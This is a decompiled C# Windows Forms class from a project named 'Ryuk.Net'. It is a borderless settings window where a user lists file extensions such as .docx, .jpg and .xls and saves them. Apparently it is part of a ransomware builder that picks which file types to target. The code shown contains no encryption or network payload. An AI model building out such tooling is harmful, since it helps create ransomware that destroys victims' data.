using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomWindowsForm;
using Ryuk.Net.Properties;

namespace Ryuk.Net;

public class extensions : Form
{
	private bool mouseDown;

	private Point lastLocation;

	private IContainer components = null;

	private Panel panel1;

	private ButtonZ _CloseButton;

	private TextBox textBox1;

	private Button button1;

	private Label label1;

	public extensions()
	{
		InitializeComponent();
	}

	private void _CloseButton_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		Settings.Default.extensions = ((Control)textBox1).Text;
		MessageBox.Show("Saved successfully");
	}

	private void extensions_Load(object sender, EventArgs e)
	{
		((Control)textBox1).Text = Settings.Default.extensions;
	}

	private void extensions_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.Location;
	}

	private void extensions_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void extensions_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).Location = new Point(((Form)this).Location.X - lastLocation.X + e.X, ((Form)this).Location.Y - lastLocation.Y + e.Y);
			((Control)this).Update();
		}
	}

	private void panel1_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDown = true;
		lastLocation = e.Location;
	}

	private void panel1_MouseUp(object sender, MouseEventArgs e)
	{
		mouseDown = false;
	}

	private void panel1_MouseMove(object sender, MouseEventArgs e)
	{
		if (mouseDown)
		{
			((Form)this).Location = new Point(((Form)this).Location.X - lastLocation.X + e.X, ((Form)this).Location.Y - lastLocation.Y + e.Y);
			((Control)this).Update();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_016b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Expected O, but got Unknown
		//IL_021e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		//IL_02e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Expected O, but got Unknown
		//IL_03cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d6: Expected O, but got Unknown
		//IL_0556: Unknown result type (might be due to invalid IL or missing references)
		//IL_0560: Expected O, but got Unknown
		//IL_0569: Unknown result type (might be due to invalid IL or missing references)
		//IL_0573: Expected O, but got Unknown
		//IL_057c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0586: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(extensions));
		panel1 = new Panel();
		label1 = new Label();
		button1 = new Button();
		textBox1 = new TextBox();
		_CloseButton = new ButtonZ();
		((Control)panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).Controls.Add((Control)(object)label1);
		((Control)panel1).Controls.Add((Control)(object)button1);
		((Control)panel1).Controls.Add((Control)(object)textBox1);
		((Control)panel1).Controls.Add((Control)(object)_CloseButton);
		((Control)panel1).Location = new Point(3, 2);
		((Control)panel1).Name = "panel1";
		((Control)panel1).Size = new Size(644, 575);
		((Control)panel1).TabIndex = 2;
		((Control)panel1).MouseDown += new MouseEventHandler(panel1_MouseDown);
		((Control)panel1).MouseMove += new MouseEventHandler(panel1_MouseMove);
		((Control)panel1).MouseUp += new MouseEventHandler(panel1_MouseUp);
		((Control)label1).AutoSize = true;
		((Control)label1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)label1).ForeColor = Color.White;
		((Control)label1).Location = new Point(25, 20);
		((Control)label1).Name = "label1";
		((Control)label1).Size = new Size(504, 20);
		((Control)label1).TabIndex = 4;
		((Control)label1).Text = "Add your extensions like this    \".docx\",\".txt\",\".jpg\",\".png\",\".xls\"";
		((Control)button1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)button1).Cursor = Cursors.Hand;
		((Control)button1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)button1).ForeColor = SystemColors.ControlLightLight;
		((Control)button1).Location = new Point(90, 528);
		((Control)button1).Name = "button1";
		((Control)button1).Size = new Size(427, 34);
		((Control)button1).TabIndex = 3;
		((Control)button1).Text = "SAVE";
		((ButtonBase)button1).UseVisualStyleBackColor = false;
		((Control)button1).Click += button1_Click;
		((Control)textBox1).BackColor = Color.FromArgb(30, 30, 30);
		((Control)textBox1).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0);
		((Control)textBox1).ForeColor = Color.White;
		((Control)textBox1).Location = new Point(19, 52);
		((TextBoxBase)textBox1).Multiline = true;
		((Control)textBox1).Name = "textBox1";
		((Control)textBox1).Size = new Size(609, 459);
		((Control)textBox1).TabIndex = 2;
		((Control)textBox1).Text = componentResourceManager.GetString("textBox1.Text");
		((Control)_CloseButton).Anchor = (AnchorStyles)9;
		_CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_CloseButton.DisplayText = "X";
		((ButtonBase)_CloseButton).FlatStyle = (FlatStyle)0;
		((Control)_CloseButton).Font = new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)_CloseButton).ForeColor = Color.White;
		((Control)_CloseButton).Location = new Point(613, 3);
		_CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_CloseButton).Name = "_CloseButton";
		((Control)_CloseButton).Size = new Size(31, 24);
		((Control)_CloseButton).TabIndex = 1;
		((Control)_CloseButton).Text = "X";
		_CloseButton.TextLocation_X = 6;
		_CloseButton.TextLocation_Y = 1;
		((ButtonBase)_CloseButton).UseVisualStyleBackColor = true;
		((Control)_CloseButton).Click += _CloseButton_Click;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.FromArgb(30, 30, 30);
		((Form)this).ClientSize = new Size(659, 589);
		((Control)this).Controls.Add((Control)(object)panel1);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Control)this).Name = "extensions";
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "extensions";
		((Form)this).Load += extensions_Load;
		((Control)this).MouseDown += new MouseEventHandler(extensions_MouseDown);
		((Control)this).MouseMove += new MouseEventHandler(extensions_MouseMove);
		((Control)this).MouseUp += new MouseEventHandler(extensions_MouseUp);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
